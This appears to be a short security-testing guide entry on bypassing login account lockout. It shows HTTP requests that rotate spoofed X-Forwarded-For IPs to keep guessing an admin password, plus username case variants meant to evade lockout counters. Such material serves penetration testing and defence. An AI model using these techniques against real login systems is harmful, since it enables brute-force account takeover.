# Example 1: Account Lockout Bypass

**Scenario:** Test if account lockout can be bypassed

```bash
# Step 1: Identify lockout threshold
# Try 5 wrong passwords for admin account
# Result: "Account locked for 30 minutes"

# Step 2: Test bypass via IP rotation
# Use X-Forwarded-For header
POST /login HTTP/1.1
X-Forwarded-For: 192.168.1.1
username=admin&password=attempt1

# Increment IP for each attempt
X-Forwarded-For: 192.168.1.2
# Continue until successful or confirmed blocked

# Step 3: Test bypass via case manipulation
username=Admin (vs admin)
username=ADMIN
# Some systems treat these as different accounts
```